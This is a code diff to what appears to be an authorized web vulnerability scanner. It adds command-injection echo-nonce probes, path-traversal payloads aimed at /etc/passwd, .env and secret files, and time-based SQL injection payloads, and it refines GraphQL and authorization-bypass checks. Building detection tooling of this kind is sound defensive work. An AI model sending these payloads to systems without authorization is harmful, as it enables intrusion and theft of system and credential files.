@@ -885,6 +885,7 @@ export type DifferentialProbeClass =
   | 'sqli_boolean' | 'sqli_time_diff' | 'ssti_math' | 'ssrf_canary' | 'nosqli_type'
   | 'path_traversal_benign' | 'graphql_audit' | 'authz_matrix' | 'workflow_invariant'
   | 'xss_context' | 'auth_protocol_audit' | 'xxe_canary' | 'cache_poison_deception' | 'mass_assignment'
+  | 'command_injection'
 
 export interface ProbeDifferentialRequest {
   probeClass: DifferentialProbeClass
@@ -917,6 +918,8 @@ export interface ProbeDifferentialRequest {
   runId?: string
   assignmentId?: string
   storage?: Store
+  /** authz_matrix function-level bodies (positional array for server actions or keyed object). */
+  functionBody?: unknown
   /** authz_matrix & producer-consumer BOLA lifecycle */
   dependencyId?: string
   producerPath?: string
@@ -932,6 +935,9 @@ export interface ProbeDifferentialRequest {
   expectedTransitions?: string[]
   /** graphql_audit schema-driven SDL resolver fuzzer */
   sdl?: string
+  /** Persona user ids used to interpret ownership fields in cross-persona GraphQL reads. */
+  ownerUserId?: string
+  otherUserId?: string
   testMutations?: boolean
   maxDepth?: number
   maxAliases?: number
@@ -1325,6 +1331,124 @@ async function diffPathNormalization(ctx: DiffContext): Promise<DiffOutcome> {
   }
 }
 
+/**
+ * Command-injection nonce oracle. Injects semicolon/subshell/pipe/backtick echo variants into a
+ * parameter that plausibly reaches a shell (host/ip/name/path/cmd/diagnostic endpoints). Execution
+ * is proven only when the fresh nonce appears in the response while the sent template does not
+ * (which rules out plain input reflection).
+ */
+async function diffCommandInjection(ctx: DiffContext): Promise<DiffOutcome> {
+  const { req, send, anomalies } = ctx
+  const baseValue = req.baselineValue ?? (req.paramLocation === 'path' ? '1' : '127.0.0.1')
+  const base = await send(injectParam(req, baseValue))
+  if (!base) return { verdict: 'inconclusive', summary: 'Baseline request failed.', details: {} }
+  const nonce = `gn${randToken(10)}`
+  const variants: Array<{ name: string; build: (n: string) => string }> = [
+    { name: 'semicolon_echo', build: n => `${baseValue}; echo ${n}` },
+    { name: 'subshell_echo', build: n => `${baseValue}$(echo ${n})` },
+    { name: 'pipe_echo', build: n => `${baseValue} | echo ${n}` },
+    { name: 'backtick_echo', build: n => `${baseValue}\`echo ${n}\`` },
+  ]
+  const results: Array<Record<string, unknown>> = []
+  for (const variant of variants) {
+    const payload = variant.build(nonce)
+    const ex = await send(injectParam(req, payload))
+    if (!ex) continue
+    const nonceInBody = ex.body.includes(nonce)
+    const templateReflected = ex.body.includes(payload)
+    const executed = nonceInBody && !templateReflected
+    results.push({ variant: variant.name, status: ex.status, nonceInBody, templateReflected, executed })
+    if (executed) {
+      anomalies.push({
+        type: 'command_executed', variant: variant.name, baseValue, nonce,
+        status: ex.status, suggestedReplayKind: 'rce_proof',
+      })
+      return {
+        verdict: 'signal',
+        summary: `Fresh shell nonce appeared in output for the ${variant.name} variant without template reflection (command executed).`,
+        details: { results, baseStatus: base.status, suggestedReplayKind: 'rce_proof' },
+      }
+    }
+  }
+  return {
+    verdict: 'no_signal',
+    summary: 'No command-execution nonce appeared in output across echo variants.',
+    details: { results, baseStatus: base.status },
+  }
+}
+
+/**
+ * File-path traversal oracle. Unlike a pure normalization differential, this proves a jail escape by
+ * reading a synthetic known file outside the served directory (classic passwd signature) or by
+ * returning content that a nonexistent sibling traversal cannot produce. It never touches host files
+ * unless the target itself does so; only response bytes are compared.
+ */
+async function diffFileTraversal(ctx: DiffContext): Promise<DiffOutcome> {
+  const { req, send, anomalies } = ctx
+  const param = req.param
+  if (!param) return { verdict: 'inconclusive', summary: 'A file/path parameter is required for the traversal oracle.', details: {} }
+  const location: SurfaceParamLocation = req.paramLocation ?? 'query'
+  const missing = `guardian-none-${randToken(8)}.txt`
+  const controlValues = [`../${missing}`, `..%2f${missing}`, missing]
+  const controls: Array<{ value: string; status: number; body: string }> = []
+  for (const value of controlValues.slice(0, 2)) {
+    const ex = await send(injectParam({ ...req, param }, value))
+    if (ex) controls.push({ value, status: ex.status, body: ex.body.slice(0, 2000) })
+  }
+  const controlOk = controls.length > 0 && controls.every(c => c.status >= 400 || c.body.length === 0)
+  const controlBodies = controls.map(c => c.body).join('\n')
+  const passwdSignature = /^[A-Za-z0-9_.-]+:[^:\n]*:\d+:\d+:[^:\n]*:[^:\n]*:[^\n]*$/m
+  const candidates = [
+    { value: '../../../../etc/passwd', kind: 'passwd' },
+    { value: '../../../../../../etc/passwd', kind: 'passwd' },
+    { value: '..%2f..%2f..%2f..%2fetc%2fpasswd', kind: 'passwd' },
+    { value: '..%252f..%252f..%252f..%252fetc%252fpasswd', kind: 'passwd' },
+    { value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', kind: 'passwd' },
+    { value: '../../../../../../etc/hostname', kind: 'content' },
+    { value: '../secret.txt', kind: 'content' },
+    { value: '../private/secret.txt', kind: 'content' },
+    { value: '..%252fprivate%252fsecret.txt', kind: 'content' },
+    { value: '..%252f..%252fprivate%252fsecret.txt', kind: 'content' },
+    { value: '..%2fprivate%2fsecret.txt', kind: 'content' },
+    { value: '../secrets/secret.txt', kind: 'content' },
+    { value: '../internal/secret.txt', kind: 'content' },
+    { value: '../flag.txt', kind: 'content' },
+    { value: '../.env', kind: 'content' },
+    { value: '../config.json', kind: 'content' },
+  ]
+  const results: Array<Record<string, unknown>> = []
+  for (const cand of candidates) {
+    const ex = await send(injectParam({ ...req, param }, cand.value))
+    if (!ex) continue
+    const ok = ex.status >= 200 && ex.status < 300 && ex.body.trim().length > 0
+    const passwd = cand.kind === 'passwd' && passwdSignature.test(ex.body)
+    // Content oracle: a non-empty 2xx body that the nonexistent-sibling traversal could not produce.
+    const distinguishable = cand.kind === 'content' && ok && !controlBodies.includes(ex.body.slice(0, 200)) &&
+      !ex.body.includes(missing) && !ex.body.includes(cand.value)
+    results.push({ value: cand.value, kind: cand.kind, status: ex.status, bytes: ex.body.length, passwd, distinguishable })
+    if (passwd || distinguishable) {
+      const needle = passwd
+        ? (ex.body.match(passwdSignature)?.[0] ?? '').slice(0, 40)
+        : ex.body.trim().split('\n')[0]?.slice(0, 40) ?? ''
+      anomalies.push({
+        type: 'path_traversal_escape', param, location, payload: cand.value, oracle: passwd ? 'passwd_signature' : 'content_differential',
+        contentNeedle: needle, controlBlocked: controlOk, status: ex.status,
+        suggestedReplayKind: 'http_chain',
+      })
+      return {
+        verdict: 'signal',
+        summary: 'A relative-path payload read a file outside the served directory (jail-escape oracle).',
+        details: { results, controls, suggestedReplayKind: 'http_chain' },
+      }
+    }
+  }
+  return {
+    verdict: 'no_signal',
+    summary: 'No out-of-jail file read was observed; traversal variants stayed inside the served root.',
+    details: { results, controls },
+  }
+}
+
 export interface GraphqlFieldArg {
   name: string
   typeName: string
@@ -1625,33 +1749,76 @@ async function diffGraphqlSurface(ctx: DiffContext, grant: Grant): Promise<DiffO
 
   if (schema) {
     const rootQueryFields = (schema.types[schema.queryType] ?? []).slice(0, 6)
+    const idCandidates = [...new Set((req.resourceIds ?? []).filter(i => /^[A-Za-z0-9_.:-]{1,128}$/.test(i)))].slice(0, 2)
+    const walkNested = (node: unknown, path: string[]): unknown => {
+      let cur = node
+      for (const key of path) {
+        if (!cur || typeof cur !== 'object') return undefined
+        cur = (cur as Record<string, unknown>)[key]
+      }
+      return cur
+    }
+    const nonEmpty = (v: unknown): boolean => (Array.isArray(v) ? v.length > 0 : Boolean(v && typeof v === 'object' && Object.keys(v as object).length > 0))
     for (const field of rootQueryFields) {
       const op = buildGraphqlOperation(schema, 'query', field, safeMaxDepth)
       if (req.ownerPersona && req.otherPersona) {
-        const ownerEx = await send(gql(op.query, op.variables, req.ownerPersona))
-        const otherEx = await send(gql(op.query, op.variables, req.otherPersona))
-        const ownerParsed = ownerEx ? parse(ownerEx.body) : null
-        const otherParsed = otherEx ? parse(otherEx.body) : null
-        const otherHasData = Boolean(
-          otherEx && otherEx.status >= 200 && otherEx.status < 300 &&
-          otherParsed?.data && Object.values(otherParsed.data).some(v => v !== null && v !== undefined) &&
-          (!otherParsed.errors || otherParsed.errors.length === 0),
-        )
-        fuzzedQueries.push({
-          field: field.name,
-          nestedPath: op.nestedPath,
-          ownerStatus: ownerEx?.status ?? null,
-          otherStatus: otherEx?.status ?? null,
-          otherHasData,
-        })
-        if (otherHasData && ownerParsed?.data) {
-          anomalies.push({
-            type: op.nestedPath.length > 0 ? 'graphql_nested_bola' : 'graphql_cross_persona_access',
+        const idArg = field.args.find(a => /^(?:ID|String)$/.test(a.typeName))
+        const triedIds = idArg ? (idCandidates.length > 0 ? idCandidates : ['1']) : [undefined]
+        for (const idValue of triedIds) {
+          const variables = { ...op.variables }
+          if (idArg && idValue !== undefined) variables[idArg.name] = idValue
+          const ownerEx = await send(gql(op.query, variables, req.ownerPersona))
+          const otherEx = await send(gql(op.query, variables, req.otherPersona))
+          const ownerParsed = ownerEx ? parse(ownerEx.body) : null
+          const otherParsed = otherEx ? parse(otherEx.body) : null
+          const otherData = otherParsed?.data?.[field.name]
+          const ownerData = ownerParsed?.data?.[field.name]
+          const otherHasData = Boolean(
+            otherEx && otherEx.status >= 200 && otherEx.status < 300 && otherData !== null && otherData !== undefined,
+          )
+          fuzzedQueries.push({
             field: field.name,
+            resourceId: idValue ?? null,
             nestedPath: op.nestedPath,
-            otherPersona: req.otherPersona,
-            status: otherEx!.status,
+            ownerStatus: ownerEx?.status ?? null,
+            otherStatus: otherEx?.status ?? null,
+            otherHasData,
           })
+          if (!otherHasData || ownerData === null || ownerData === undefined) continue
+          // Both actors must be reading the *same* root object. `me`-style resolvers return a
+          // different node per caller, so identical nested shapes there are not object-level BOLA.
+          if (ownerData && otherData && typeof ownerData === 'object' && typeof otherData === 'object') {
+            const ownerRootId = (ownerData as Record<string, unknown>).id
+            const otherRootId = (otherData as Record<string, unknown>).id
+            if (ownerRootId !== undefined && otherRootId !== undefined && String(ownerRootId) !== String(otherRootId)) continue
+          }
+          // Nested-resource BOLA: both actors receive the same owned sub-collection/data.
+          if (op.nestedPath.length > 0) {
+            const ownerNested = walkNested(ownerData, op.nestedPath)
+            const otherNested = walkNested(otherData, op.nestedPath)
+            if (nonEmpty(ownerNested) && nonEmpty(otherNested) && JSON.stringify(ownerNested) === JSON.stringify(otherNested)) {
+              anomalies.push({
+                type: 'graphql_nested_bola', field: field.name, nestedPath: op.nestedPath,
+                resourceId: idValue ?? null, otherPersona: req.otherPersona, status: otherEx!.status,
+                query: op.query, variables,
+              })
+              break
+            }
+          }
+          // Single-object BOLA: the other actor receives an object that names a different owner.
+          if (idArg && otherData && typeof otherData === 'object') {
+            const ownerRef = (otherData as Record<string, unknown>).owner ?? (otherData as Record<string, unknown>).ownerId
+            const ownerId = ownerRef && typeof ownerRef === 'object' ? (ownerRef as Record<string, unknown>).id : ownerRef
+            if (typeof ownerId === 'string' && req.otherUserId && ownerId !== req.otherUserId) {
+              anomalies.push({
+                type: 'graphql_cross_persona_access', field: field.name, resourceId: idValue ?? null,
+                ownerField: ownerId, otherPersona: req.otherPersona, status: otherEx!.status,
+                query: op.query, variables,
+              })
+              break
+            }
+          }
+          if (!idArg || !idValue) break
         }
       } else {
         const ex = await send(gql(op.query, op.variables, req.persona))
@@ -1777,8 +1944,12 @@ async function diffAuthorizationMatrix(ctx: DiffContext): Promise<DiffOutcome> {
     }
   }
 
-  if (!req.pathAndQuery.includes('{{id}}') || ids.length === 0) {
-    return { verdict: 'inconclusive', summary: 'authz_matrix needs a {{id}} placeholder in pathAndQuery and resourceIds.', details: {} }
+  // Function-level mode: no object placeholder means the same privileged function is invoked by
+  // every actor (BFLA). Object-level mode substitutes each harvested resource id.
+  const functionLevel = !req.pathAndQuery.includes('{{id}}')
+  if (functionLevel && ids.length === 0) ids.push('')
+  if (!functionLevel && ids.length === 0) {
+    return { verdict: 'inconclusive', summary: 'authz_matrix needs a {{id}} placeholder or resourceIds.', details: {} }
   }
 
   // Require at least 2 distinct actors (owner+other, or anonymous, or explicit header bypass)
@@ -1802,13 +1973,56 @@ async function diffAuthorizationMatrix(ctx: DiffContext): Promise<DiffOutcome> {
   }
 
   const matrix: Array<Record<string, unknown>> = []
-  for (const id of ids) {
-    const path = req.pathAndQuery.replaceAll('{{id}}', encodeURIComponent(id))
+  const orderedIds = ids.slice(0, 6)
+  for (const id of orderedIds) {
+    const path = functionLevel ? req.pathAndQuery : req.pathAndQuery.replaceAll('{{id}}', encodeURIComponent(id))
     let ownerEx: BrokerExchangeResult | null = null
+    if (!functionLevel) {
+      // Id-selectivity gate: a value only identifies a resource when it differs from a random
+      // nonexistent value. This keeps public/list pages and arbitrary query fields out of the matrix.
+      const probeValue = `guardian-none-${randToken(8)}`
+      const missingEx = await runner.send({
+        origin: ctx.origin, method, pathAndQuery: req.pathAndQuery.replaceAll('{{id}}', encodeURIComponent(probeValue)),
+        headers: req.headers, persona: req.ownerPersona,
+        ...(req.session ? { session: req.session } : {}),
+      })
+      if (missingEx.ok) runner.stage(missingEx.ex)
+      const refPath = path
+      const refEx = req.ownerPersona
+        ? await runner.send({ origin: ctx.origin, method, pathAndQuery: refPath, headers: req.headers, persona: req.ownerPersona, ...(req.session ? { session: req.session } : {}) })
+        : null
+      if (refEx?.ok) {
+        runner.stage(refEx.ex)
+        ownerEx = refEx.ex
+        const missing = missingEx.ok ? missingEx.ex : null
+        const nonSelective = method === 'GET' && Boolean(missing) &&
+          missing!.status === refEx.ex.status && responseSimilarity(missing!.body, refEx.ex.body) >= 0.98
+        if (nonSelective) {
+          matrix.push({ resourceId: id, actor: 'owner', status: refEx.ex.status, nonSelective: true })
+          continue
+        }
+      } else if (refEx && !refEx.ok) {
+        notes.push(`owner ${id}: ${refEx.kind}`)
+      }
+      if (ownerEx && ownerEx.status >= 400) {
+        matrix.push({ resourceId: id, actor: 'owner', status: ownerEx.status, inaccessible: true })
+        continue
+      }
+    }
     for (const a of actors) {
+      // A function-level finding needs a healthy privileged control; otherwise a 2xx from the probe
+      // actor only means the endpoint ignores invalid input.
+      if (functionLevel && a.actor !== 'owner' && ownerEx && (ownerEx.status < 200 || ownerEx.status >= 300)) continue
+      if (a.actor === 'owner' && ownerEx) {
+        matrix.push({
+          resourceId: id, actor: 'owner', status: ownerEx.status, bodyBytes: ownerEx.bodyBytes,
+          bodySha256: ownerEx.bodySha256, accessible: ownerEx.status >= 200 && ownerEx.status < 300,
+        })
+        continue
+      }
       const isMutating = method === 'POST' || method === 'PUT' || method === 'PATCH'
       const bodyPayload = isMutating
-        ? JSON.stringify(req.jsonBody ?? {})
+        ? JSON.stringify(functionLevel && req.functionBody !== undefined ? req.functionBody : (req.jsonBody ?? {}))
         : undefined
       const res = await runner.send({
         origin: ctx.origin, method, pathAndQuery: path,
@@ -1837,7 +2051,11 @@ async function diffAuthorizationMatrix(ctx: DiffContext): Promise<DiffOutcome> {
         bodySha256: res.ex.bodySha256, similarityToOwner: sim, accessible: ok2xx,
       })
       if (a.actor !== 'owner' && ok2xx && (method !== 'GET' || sim === null || sim >= 0.70)) {
-        anomalies.push({ type: 'unauthorized_access', resourceId: id, actor: a.actor, method, status: res.ex.status, similarityToOwner: sim })
+        anomalies.push({
+          type: 'unauthorized_access', resourceId: id, actor: a.actor, method, status: res.ex.status, similarityToOwner: sim,
+          functionLevel,
+          ...(method !== 'GET' ? { bodyTemplate: functionLevel && req.functionBody !== undefined ? req.functionBody : (req.jsonBody ?? {}) } : {}),
+        })
       }
     }
   }
@@ -1898,11 +2116,14 @@ async function diffWorkflowInvariant(ctx: DiffContext): Promise<DiffOutcome> {
     }
   }
 
-  // Mode B: Step-skip state transition detector (e.g. draft -> refund skipping paid)
+  // Mode B: Step-skip state transition detector (e.g. draft -> confirm without payment).
   if (req.createPath || (req.expectedTransitions && req.expectedTransitions.length >= 2)) {
-    const transitions = (req.expectedTransitions ?? ['draft', 'paid', 'refunded']).map(t => t.toLowerCase())
+    const transitions = (req.expectedTransitions ?? ['draft', 'paid', 'confirmed']).map(t => t.toLowerCase())
     let initialState = transitions[0] ?? 'draft'
     let targetPath = req.pathAndQuery
+    let stateKeys: string[] = []
+    let falsePrerequisites: string[] = []
+    let createStatus: number | null = null
     if (req.createPath) {
       const createEx = await send({
         method: 'POST',
@@ -1912,7 +2133,9 @@ async function diffWorkflowInvariant(ctx: DiffContext): Promise<DiffOutcome> {
         persona: req.ownerPersona ?? req.persona,
       })
       if (createEx) {
-        const createdId = extractCreatedIdFromJson(createEx.body)
+        createStatus = createEx.status
+        const createdId = extractCreatedIdFromJson(createEx.body) ??
+          (() => { const m = /["']id["']\s*:\s*(?:"([^"]{1,128})"|(\d{1,12}))/i.exec(createEx.body); return m ? (m[1] ?? m[2]) : null })()
         if (createdId && targetPath.includes('{{id}}')) {
           targetPath = targetPath.replaceAll('{{id}}', encodeURIComponent(createdId))
         }
@@ -1920,7 +2143,18 @@ async function diffWorkflowInvariant(ctx: DiffContext): Promise<DiffOutcome> {
           const parsed = JSON.parse(createEx.body) as Record<string, unknown>
           const st = parsed.status ?? parsed.state
           if (typeof st === 'string' && st.trim()) initialState = st.trim().toLowerCase()
-        } catch { /* ignore */ }
+          for (const [key, value] of Object.entries(parsed)) {
+            if (typeof value === 'boolean' && /^(?:paid|payment|approved|authorized|verified|confirmed|activated|completed|fulfilled|shipped)$/i.test(key)) {
+              stateKeys.push(key)
+              if (value === false) falsePrerequisites.push(key)
+            }
+          }
+        } catch { /* ignore non-JSON create bodies */ }
+      } else {
+        return { verdict: 'no_signal', summary: 'Prerequisite create step failed; step-skip not tested.', details: { suggestedReplayKind: 'http_chain' } }
+      }
+      if (createStatus !== null && (createStatus < 200 || createStatus >= 300)) {
+        return { verdict: 'no_signal', summary: 'Prerequisite create step was rejected; step-skip not tested.', details: { createStatus, suggestedReplayKind: 'http_chain' } }
       }
     }
 
@@ -1943,13 +2177,17 @@ async function diffWorkflowInvariant(ctx: DiffContext): Promise<DiffOutcome> {
 
       const initialIdx = transitions.indexOf(initialState)
       const observedIdx = observedState ? transitions.indexOf(observedState) : -1
+      const stateAdvanced = observedState !== null && observedState !== initialState
+      // Any fresh object (draft) whose action succeeds while its prerequisite flags are still false
+      // has skipped a required step; a normal draft->paid->confirmed transition never does.
       const skippedStep = explicitSkipped ||
-        (initialIdx >= 0 && observedIdx >= initialIdx + 2) ||
-        (observedState !== null && observedState !== initialState && observedIdx === transitions.length - 1)
+        (stateAdvanced && (falsePrerequisites.length > 0 || (initialIdx >= 0 && observedIdx >= initialIdx + 2)))
       checks.push({
         kind: 'step_skip',
         initialState,
         observedState,
+        falsePrerequisites,
+        createStatus,
         status: skipEx.status,
         skippedStep,
       })
@@ -1958,7 +2196,11 @@ async function diffWorkflowInvariant(ctx: DiffContext): Promise<DiffOutcome> {
           type: 'workflow_step_skip',
           fromState: initialState,
           toState: observedState ?? transitions[transitions.length - 1],
+          falsePrerequisites,
           path: targetPath,
+          targetTemplate: req.pathAndQuery,
+          createPath: req.createPath ?? null,
+          producerBody: req.producerBody ?? req.jsonBody ?? {},
           status: skipEx.status,
         })
       }
@@ -2002,13 +2244,19 @@ async function diffSqlTimeDifferential(ctx: DiffContext, grant: Grant): Promise<
   const delaySecInt = Math.max(1, Math.round(delayMs / 1000))
   const baseValue = req.baselineValue ?? '1'
 
+  const sqliteDelay = Math.min(90_000_000, delayMs * 25_000)
   const allCandidates: Array<{ dialect: 'mysql' | 'postgres' | 'mssql' | 'sqlite'; style: string; payload: string }> = [
     { dialect: 'mysql', style: 'numeric', payload: `${baseValue} AND SLEEP(${delaySec})` },
     { dialect: 'mysql', style: 'single_quote', payload: `${baseValue}' AND SLEEP(${delaySec})-- -` },
     { dialect: 'postgres', style: 'single_quote', payload: `${baseValue}' AND (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL-- -` },
     { dialect: 'postgres', style: 'numeric', payload: `${baseValue} AND (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL` },
     { dialect: 'mssql', style: 'single_quote', payload: `${baseValue}'; WAITFOR DELAY '0:0:${delaySecInt}'-- -` },
-    { dialect: 'sqlite', style: 'single_quote', payload: `${baseValue}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${Math.min(90_000_000, delayMs * 25_000)}))))-- -` },
+    { dialect: 'sqlite', style: 'single_quote', payload: `${baseValue}' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${sqliteDelay}))))-- -` },
+    // OR-branch variants keep the delay expression reachable when the left comparison is false (a
+    // blind query often filters on a value the caller's own baseline does not match).
+    { dialect: 'mysql', style: 'or_branch', payload: `${baseValue}' OR SLEEP(${delaySec})-- -` },
+    { dialect: 'postgres', style: 'or_branch', payload: `${baseValue}' OR (SELECT 1 FROM pg_sleep(${delaySec})) IS NULL-- -` },
+    { dialect: 'sqlite', style: 'or_branch', payload: `${baseValue}' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(${sqliteDelay}))))-- -` },
   ]
   const candidates = req.dialect
     ? [
@@ -2750,7 +2998,14 @@ export async function probeDifferential(
       case 'ssti_math': outcome = await diffTemplateMath(ctx); break
       case 'ssrf_canary': outcome = await diffCanaryCallback(ctx, canaryBroker, grant, signal); break
       case 'nosqli_type': outcome = await diffOperatorTypes(ctx); break
-      case 'path_traversal_benign': outcome = await diffPathNormalization(ctx); break
+      case 'path_traversal_benign':
+        // A named file/path parameter gets the genuine jail-escape oracle; pure path-shape probing
+        // falls back to the benign normalization differential.
+        outcome = req.param && (req.paramLocation ?? 'query') !== 'path'
+          ? await diffFileTraversal(ctx)
+          : await diffPathNormalization(ctx)
+        break
+      case 'command_injection': outcome = await diffCommandInjection(ctx); break
       case 'graphql_audit': outcome = await diffGraphqlSurface(ctx, grant); break
       case 'authz_matrix': outcome = await diffAuthorizationMatrix(ctx); break
       case 'workflow_invariant': outcome = await diffWorkflowInvariant(ctx); break
